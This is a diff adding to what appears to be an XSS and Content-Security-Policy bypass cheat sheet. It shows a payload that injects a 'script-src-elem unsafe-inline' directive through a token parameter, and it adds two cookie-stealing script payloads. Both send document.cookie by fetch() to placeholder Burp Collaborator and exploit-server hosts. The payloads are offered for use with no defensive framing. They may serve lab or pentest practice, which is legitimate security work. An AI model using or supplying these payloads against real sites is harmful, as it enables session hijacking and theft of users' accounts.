@@ -353,3 +353,16 @@ Also we can try to override script-src-elem directive in Chrome.
 ```
 <script>alert()</script>&token=;script-src-elem 'unsafe-inline'
 ```
+
+## Helpful
+Steal cookies collaborator:
+```
+<script>
+fetch(‘https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
+</script>
+```
+
+Steal Cookies Exploit Server:
+```
+<script> fetch(‘https://YOUR-SUBDOMAIN-HERE.exploitserver.net/x’+document.cookie); </script>
+```
